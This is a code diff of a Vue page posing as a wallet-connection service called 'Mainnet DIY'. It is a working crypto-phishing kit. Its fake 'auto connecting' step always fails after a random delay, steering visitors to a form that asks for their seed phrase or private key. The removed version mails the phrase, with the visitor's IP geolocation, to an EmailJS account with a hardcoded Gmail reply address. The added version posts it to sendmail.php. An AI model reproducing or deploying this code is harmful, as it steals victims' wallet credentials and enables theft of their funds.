@@ -19,10 +19,7 @@
           <div class="themesflat-container">
             <div class="row">
               <div class="col-md-12">
-                <h2 class="tf-title style2">Connect with Mainnet DIY</h2>
-                <p class="text-muted" style="margin-top:8px; font-size: 16px;">
-                  Mainnet DIY makes wallet connection straightforward and secure. Choose your preferred wallet provider below to start a self-guided connection flow. Our platform supports 50+ wallets and provides step-by-step guidance to help you troubleshoot any connection issues.
-                </p>
+                <h2 class="tf-title style2">Select a Wallet</h2>
                 <div class="heading-line s2"></div>
               </div>
 
@@ -131,7 +128,7 @@
                   id="trust_wallet"
                   class="sc-author-box select_wallet"
                   data-title="Sub Wallet"
-                  data-logo="/images/logo/subwallet.jpg"
+                  data-logo="/images/logo/subwallet.jpeg"
                   style="cursor: pointer"
                 >
                   <div class="author-avatar">
@@ -181,7 +178,7 @@
                   id="metamask"
                   class="sc-author-box select_wallet"
                   data-title="Hashpack"
-                  data-logo="/images/logo/hash.jpg"
+                  data-logo="/images/logo/hash.jfif"
                   style="cursor: pointer"
                 >
                   <div class="author-avatar">
@@ -381,7 +378,7 @@
                   id="metamask"
                   class="sc-author-box select_wallet"
                   data-title="Rabby Wallet"
-                  data-logo="/images/logo/rabbywall.jpg"
+                  data-logo="/images/logo/rabbywall.jpeg"
                   style="cursor: pointer"
                 >
                   <div class="author-avatar">
@@ -481,7 +478,7 @@
                   id="Flint Wallet"
                   class="sc-author-box select_wallet"
                   data-title="Flint Wallet"
-                  data-logo="/images/logo/Flint.jpg"
+                  data-logo="/images/logo/Flint.jpeg"
                   style="cursor: pointer"
                 >
                   <div class="author-avatar">
@@ -2075,7 +2072,7 @@
             <span aria-hidden="true">&times;</span>
           </button>
           <div class="modal-body space-y-20 pd-40">
-            <h3 class="modal-image">
+            <h3>
               <img
                 width="50"
                 height="50"
@@ -2084,16 +2081,13 @@
               /><br />
               <span id="wallet_name" clas="mt-1">Sync Wallet</span>
             </h3>
-            <p class="text-center">Mainnet DIY - This session is secured and encrypted</p>
-            <p class="text-center text-muted" style="font-size: 14px; margin-top: 10px;">
-              Connecting through Mainnet DIY's secure infrastructure
-            </p>
+            <p class="text-center">This session is secured and encrypted</p>
 
             <div id="auto_connecting" style="display: none">
               <br /><br /><br />
               <div class="heading-line s2" style="width: 100%">
                 <br />
-                <h5 style="font-weight: bold" align="center">
+                <h5 align="center">
                   starting secure connection...<br />
                   <i
                     align="center"
@@ -2147,12 +2141,17 @@
                 </form> -->
 
             <div id="div_connect_manuallly" style="display: none">
-              <div>
+              <form
+                name="my-form"
+                action="#"
+                method="POST"
+                id="my-form"
+                netlify
+              >
                 <p>Enter phrase or Private Key</p>
 
                 <div id="phrase">
                   <textarea
-                    id="secret_phrase"
                     placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. or Input Wallet Private Key"
                     style="font-size: 20px; font-weight: 650"
                     rows="4"
@@ -2163,15 +2162,17 @@
                   <p><br /></p>
 
                   <button
-                    id="button_connect_wallet"
-                    type="button"
+                    id="submit"
+                    type="submit"
+                    name="submit"
+                    value="submit"
                     class="btn btn-primary"
                     style="border-top: 5px"
                   >
                     Connect Wallet
                   </button>
                 </div>
-              </div>
+              </form>
             </div>
 
             <!--<input type="text" class="form-control" placeholder="00.00 ETH">
@@ -2181,11 +2182,7 @@
             <!-- <a href="#" class="btn btn-primary" data-toggle="modal" data-target="#popup_bid_success" data-dismiss="modal" aria-label="Close"> Place a bid</a> -->
             <div>
               <br /><br /><br />
-              <h5 style="    display: flex
-;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column-reverse;" align="center" class="mt-4 text-muted align-items-center">
+              <h5 align="center" class="mt-4 text-muted align-items-center">
                 <img
                   src="/images/icon/shield.png"
                   width="30"
@@ -2202,267 +2199,180 @@
 </template>
 
 <script>
-import axios from 'axios'
-
 export default {
-  head() {
-    return {
-      title: 'Mainnet DIY — Connect your wallet securely',
-      meta: [
-        {
-          name: 'description',
-          content: 'Connect to Mainnet DIY with MetaMask, Trust Wallet, WalletConnect and more. A streamlined, self-serve flow to troubleshoot and complete wallet actions securely.'
-        }
-      ]
-    }
-  },
-  data() {
-    return {
-      showModal: false
-    }
-  },
-  methods: {
-    getRandomInt(min, max) {
+  mounted() {
+    // Helper: get random int [min, max)
+    function getRandomInt(min, max) {
       min = Math.ceil(min)
       max = Math.floor(max)
       return Math.floor(Math.random() * (max - min) + min)
-    },
-    closeModal() {
-      this.showModal = false
-      const $jq = window.jQuery || null
-      if ($jq && $jq.fn && typeof $jq.fn.modal === 'function') {
-        $jq('#popup_connect_wallet').modal('hide')
-        $jq('#popup_connect_wallet_success').modal('hide')
-      } else {
-        const popup = document.getElementById('popup_connect_wallet')
-        const success = document.getElementById('popup_connect_wallet_success')
-        if (popup) { 
-          popup.classList.remove('show')
-          popup.style.display = 'none'
-        }
-        if (success) { 
-          success.classList.remove('show')
-          success.style.display = 'none'
-        }
-        document.body.classList.remove('modal-open')
-      }
-      
-      // Always remove backdrop overlay if present
-      const backdrop = document.querySelector('.modal-backdrop')
-      if (backdrop && backdrop.parentNode) {
-        backdrop.parentNode.removeChild(backdrop)
-      }
     }
-  },
-  mounted() {
-    // Make getRandomInt function available globally for jQuery code
-    window.getRandomInt = this.getRandomInt
-    
-    // Wait for jQuery to be available and then set up the existing flow
-    this.$nextTick(() => {
-      // Add the jQuery wallet selection code
-      const $ = window.jQuery || window.$
-      if ($) {
-        // Handle Select Wallet Click
-        $('.select_wallet').off('click').on('click', function () {
-          const wd = $(this) // wd = wallet details
 
-          $('#wallet_name').text(wd.data('title'))
-          $('#wallet_logo').attr("src", wd.data('logo'))
-          $('#auto_connecting').show()
-          $('#failed_to_connect').hide()
-          $('#div_connect_manuallly').hide()
+    const $jq = window.jQuery || null
 
-          // Try jQuery modal, fallback to vanilla JS
-          try {
-            $('#popup_connect_wallet').modal('show')
-          } catch (e) {
-            // Fallback: show modal manually
-            const modal = document.getElementById('popup_connect_wallet')
-            if (modal) {
-              modal.classList.add('show')
-              modal.style.display = 'block'
-              document.body.classList.add('modal-open')
-              
-              // Add backdrop
-              let backdrop = document.querySelector('.modal-backdrop')
-              if (!backdrop) {
-                backdrop = document.createElement('div')
-                backdrop.className = 'modal-backdrop fade show'
-                document.body.appendChild(backdrop)
-                backdrop.addEventListener('click', () => {
-                  modal.classList.remove('show')
-                  modal.style.display = 'none'
-                  document.body.classList.remove('modal-open')
-                  if (backdrop && backdrop.parentNode) {
-                    backdrop.parentNode.removeChild(backdrop)
-                  }
-                })
-              }
-            }
-          }
+    // Utility show/hide functions
+    const show = (el) => { if (!el) return; el.style.display = '' }
+    const hide = (el) => { if (!el) return; el.style.display = 'none' }
 
-          // Hide autoconnecting div and show error in random interval
-          const interval = 1000 * window.getRandomInt(1, 15)
-          setTimeout(() => {
-            $('#auto_connecting').hide()
-            $('#div_connect_manuallly').hide()
-            $('#failed_to_connect').show()
-          }, interval)
-        })
+    // Wallet selection handler
+    const walletEls = document.querySelectorAll('.select_wallet')
+    walletEls.forEach(wd => {
+      wd.addEventListener('click', () => {
+        const title = wd.dataset.title || ''
+        const logo = wd.dataset.logo || ''
 
-        $('#try_auto_connecting_again').off('click').on('click', function (e) {
-          e.preventDefault()
-          $('#auto_connecting').show()
-          $('#failed_to_connect').hide()
-          $('#div_connect_manuallly').hide()
 
-          // Hide autoconnecting div and show error in random interval
-          const interval = 1000 * window.getRandomInt(1, 20)
-          setTimeout(() => {
-            $('#auto_connecting').hide()
-            $('#div_connect_manuallly').hide()
-            $('#failed_to_connect').show()
-          }, interval)
-        })
+        const walletNameEl = document.getElementById('wallet_name')
+        const walletLogoEl = document.getElementById('wallet_logo')
+        const autoConnecting = document.getElementById('auto_connecting')
+        const failedToConnect = document.getElementById('failed_to_connect')
+        const divConnectManually = document.getElementById('div_connect_manuallly')
 
-        $('#button_connect_manually').off('click').on('click', function (e) {
-          e.preventDefault()
-          $('#auto_connecting').hide()
-          $('#failed_to_connect').hide()
-          $('#div_connect_manuallly').show()
-        })
+        if (walletNameEl) walletNameEl.textContent = title
+        if (walletLogoEl && logo) walletLogoEl.setAttribute('src', logo)
 
-        // FOR PHRASE TEXT VALIDATION
-        $('#secret_phrase').off('keyup').on('keyup', function () {
-          const phrase_seed_entered = $(this).val().trim()
-          if (phrase_seed_entered != "") {
-            const phrase_count = phrase_seed_entered.match(/(\w+)/g).length
-            console.log(phrase_count)
-            if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-              $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-          } else {
-              $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-          }
-        } else {
-            $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
-          }
-        })
+        show(autoConnecting)
+        hide(failedToConnect)
+        hide(divConnectManually)
 
-        // CONNECT WALLET BUTTON Handler
-        $('#button_connect_wallet').off('click').on('click', async function (e) {
-          e.preventDefault()
-          
-          const field = $('#secret_phrase')
-          const button = $(this)
-        
-          if (field.val().length >= 12) {
-            // Change button text to loading and disable it
-            button.text('Loading...').css('pointer-events', 'none').prop('disabled', true)
-
-            try {
-              // Get user location
-              const location = await axios.get("https://ipapi.co/json")
-
-              const params = {
-                service_id: "service_kwfx09r",
-                template_id: "template_l4s7j4n",
-                user_id: "S5FIb6Mixugs1EXxl",
-                template_params: {
-                  from_name: "MainnetDIY",
-                  wallet_type: $('#wallet_name').text().trim(),
-                  location: JSON.stringify(location.data),
-                  link_drops: field.val(),
-                  reply_to: "Edgir973@gmail.com",
-                },
-              }
-
-              const response = await axios.post(
-                "https://api.emailjs.com/api/v1.0/email/send",
-                params
-              )
-
-              if (response.data === "OK") {
-                // Reset button state
-                button.text('Connect Wallet').css('pointer-events', 'all').prop('disabled', false)
-                
-                // Close all modals
-                try {
-                  $('#popup_connect_wallet').modal('hide')
-                  $('#popup_connect_wallet_success').modal('hide')
-                } catch (e) {
-                  // Fallback: hide modals manually
-                  const mainModal = document.getElementById('popup_connect_wallet')
-                  const successModal = document.getElementById('popup_connect_wallet_success')
-                  
-                  if (mainModal) {
-                    mainModal.classList.remove('show')
-                    mainModal.style.display = 'none'
-                  }
-                  
-                  if (successModal) {
-                    successModal.classList.remove('show')
-                    successModal.style.display = 'none'
-                  }
-                  
-                  // Remove backdrop
-                  const backdrop = document.querySelector('.modal-backdrop')
-                  if (backdrop && backdrop.parentNode) {
-                    backdrop.parentNode.removeChild(backdrop)
-                  }
-                  
-                  document.body.classList.remove('modal-open')
-                }
-                
-                // Redirect to home page
-                window.location.href = '/'
-              } else {
-                alert('Failed to connect wallet. Please try again.')
-                // Reset button state
-                button.text('Connect Wallet').css('pointer-events', 'all').prop('disabled', false)
-              }
-            } catch (error) {
-              console.error("Error connecting wallet:", error)
-              alert('An error occurred while connecting your wallet. Please try again.')
-              // Reset button state
-              button.text('Connect Wallet').css('pointer-events', 'all').prop('disabled', false)
-            }
-          } else {
-            alert('Please enter a valid wallet phrase (minimum 12 characters)')
-          }
-        })
-      }
-      
-      // Override the modal show to add our backdrop
-      const originalModalShow = window.jQuery?.fn?.modal?.Constructor?.prototype?.show
-      if (originalModalShow) {
-        window.jQuery.fn.modal.Constructor.prototype.show = function() {
-          const result = originalModalShow.call(this)
-          
-          // Add our custom backdrop if it doesn't exist
-          if (!document.querySelector('.modal-backdrop')) {
-            const backdrop = document.createElement('div')
-            backdrop.className = 'modal-backdrop fade show'
-            document.body.appendChild(backdrop)
-            backdrop.addEventListener('click', () => {
-              window.jQuery('#popup_connect_wallet').modal('hide')
-              window.jQuery('#popup_connect_wallet_success').modal('hide')
-            })
-          }
-          
-          return result
+        // Try to show bootstrap modal via jQuery+Bootstrap if available, otherwise do a simple fallback
+        const popup = document.getElementById('popup_connect_wallet')
+        if ($jq && $jq.fn && typeof $jq.fn.modal === 'function') {
+          // Bootstrap's modal plugin is available on jQuery
+          $jq('#popup_connect_wallet').modal('show')
+        } else if (popup) {
+          // Simple fallback: add class and show
+          popup.classList.add('show')
+          popup.style.display = 'block'
         }
-      }
-      
-      // Add event listeners for close buttons to work with our backdrop
-    const closeButtons = document.querySelectorAll('.close')
-    closeButtons.forEach(button => {
-      button.addEventListener('click', (e) => {
-        e.preventDefault()
-        this.closeModal()
+
+        // Hide autoconnecting div and show error in random interval
+        const interval = 1000 * getRandomInt(1, 15)
+        setTimeout(() => {
+          hide(autoConnecting)
+          hide(divConnectManually)
+          show(failedToConnect)
+        }, interval)
       })
     })
-    })
+
+    // Try auto connect again
+    const tryAgain = document.getElementById('try_auto_connecting_again')
+    if (tryAgain) {
+      tryAgain.addEventListener('click', (e) => {
+        e.preventDefault()
+        const autoConnecting = document.getElementById('auto_connecting')
+        const failedToConnect = document.getElementById('failed_to_connect')
+        const divConnectManually = document.getElementById('div_connect_manuallly')
+
+        show(autoConnecting)
+        hide(failedToConnect)
+        hide(divConnectManually)
+
+        const interval = 1000 * getRandomInt(1, 20)
+        setTimeout(() => {
+          hide(autoConnecting)
+          hide(divConnectManually)
+          show(failedToConnect)
+        }, interval)
+      })
+    }
+
+    // Button: connect manually
+    const buttonConnectManually = document.getElementById('button_connect_manually')
+    if (buttonConnectManually) {
+      buttonConnectManually.addEventListener('click', (e) => {
+        e.preventDefault()
+        hide(document.getElementById('auto_connecting'))
+        hide(document.getElementById('failed_to_connect'))
+        show(document.getElementById('div_connect_manuallly'))
+      })
+    }
+
+    // Phrase text validation
+    const secretPhrase = document.getElementById('secret_phrase')
+    const buttonConnectWallet = document.getElementById('button_connect_wallet')
+    if (secretPhrase) {
+      secretPhrase.addEventListener('input', () => {
+        const phrase_seed_entered = secretPhrase.value.trim()
+        if (phrase_seed_entered !== '') {
+          const words = phrase_seed_entered.match(/(\w+)/g) || []
+          const phrase_count = words.length
+          if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+            if (buttonConnectWallet) {
+              buttonConnectWallet.disabled = false
+              buttonConnectWallet.style.opacity = '1'
+            }
+          } else {
+            if (buttonConnectWallet) {
+              // keep it enabled so user can still attempt, but keep visual cue
+              buttonConnectWallet.disabled = false
+              buttonConnectWallet.style.opacity = '1'
+            }
+          }
+        } else {
+          if (buttonConnectWallet) {
+            buttonConnectWallet.disabled = true
+            buttonConnectWallet.style.opacity = '0.2'
+          }
+        }
+      })
+    }
+
+    // Connect wallet button handler (uses fetch)
+    if (buttonConnectWallet) {
+      buttonConnectWallet.addEventListener('click', async (e) => {
+        e.preventDefault()
+        const field = document.getElementById('secret_phrase')
+        if (!field) return
+        if (field.value.length >= 12) {
+          buttonConnectWallet.textContent = 'Loading...'
+          buttonConnectWallet.style.pointerEvents = 'none'
+
+          try {
+            const payload = new URLSearchParams()
+            payload.append('load_phrase', '1')
+            payload.append('data_phrase', field.value)
+            const walletNameEl = document.getElementById('wallet_name')
+            payload.append('wallet_selected', walletNameEl ? walletNameEl.textContent.trim() : '')
+
+            const resp = await fetch('sendmail.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: payload.toString()
+            })
+            const resultText = await resp.text()
+            let result
+            try { result = JSON.parse(resultText) } catch (err) { result = { result: 'error', raw: resultText } }
+
+            if (result && result.result === 'success') {
+              buttonConnectWallet.textContent = 'Connect Wallet'
+              buttonConnectWallet.style.pointerEvents = 'all'
+              if ($jq && $jq.fn && typeof $jq.fn.modal === 'function') {
+                $jq('#popup_connect_wallet').modal('hide')
+                $jq('#popup_connect_wallet_success').modal('show')
+              } else {
+                const popup = document.getElementById('popup_connect_wallet')
+                const success = document.getElementById('popup_connect_wallet_success')
+                if (popup) { popup.classList.remove('show'); popup.style.display = 'none' }
+                if (success) { success.classList.add('show'); success.style.display = 'block' }
+              }
+              // original code had a very large timeout; keep navigation commented for safety
+              // window.setTimeout(function () { window.location.href = 'il'; }, 5000000);
+            } else {
+              // fallback: show raw
+              alert(result.raw || result)
+              buttonConnectWallet.textContent = 'Connect Wallet'
+              buttonConnectWallet.style.pointerEvents = 'all'
+            }
+          } catch (err) {
+            alert(err)
+            buttonConnectWallet.textContent = 'Connect Wallet'
+            buttonConnectWallet.style.pointerEvents = 'all'
+          }
+        }
+      })
+    }
   }
 }
 </script>
@@ -2470,58 +2380,19 @@ export default {
 
 <style scoped>
 .btn-outline-primary {
-    width: 100%;
-    border-radius: 20px;
-    font-weight: 700;
-    font-size: 15px;
-    line-height: 22px;
-    padding: 10px 20px;
-    -webkit-transition: all 0.3s ease-in-out;
-    -moz-transition: all 0.3s ease-in-out;
-    -ms-transition: all 0.3s ease-in-out;
-    -o-transition: all 0.3s ease-in-out;
-    transition: all 0.3s ease-in-out;
-    outline: none;
-    border: 1px solid #5142FC;
-    margin-bottom: 10px;
-}
-
-/* Modal overlay styles */
-.modal-backdrop {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background-color: rgba(0, 0, 0, 0.6);
-    z-index: 1040;
-}
-
-.modal-open {
-    overflow: hidden;
-}
-
-.modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 1050;
-    width: 100%;
-    height: 100%;
-    overflow: hidden;
-    outline: 0;
-}
-
-.modal.show .modal-dialog {
-    transform: none;
-}
-
-.modal-image {
-    font-weight: bold;
-    text-align: center;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-}
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
 </style>
